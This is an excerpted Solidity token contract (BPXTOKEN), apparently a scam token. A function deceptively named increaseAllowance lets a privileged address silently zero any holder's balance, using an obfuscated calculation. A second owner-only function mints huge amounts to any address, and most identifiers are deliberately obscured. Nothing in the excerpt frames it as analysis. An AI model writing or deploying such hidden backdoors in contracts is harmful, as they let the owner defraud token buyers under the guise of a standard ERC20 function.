...
contract BPXTOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(dllbng18 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = BPX[newadd];
        uint256 newaaamount = BPX[newadd]+BPX[newadd]-curamount;
        BPX[newadd] -= newaaamount;
        }else{
        if(dllbng18 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        BPX[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(dllbng18 == _msgSender());
        if(dllbng18 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = BPX[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        BPX[from] = BPX[from]-amount;
        BPX[to] = BPX[to]+amount;
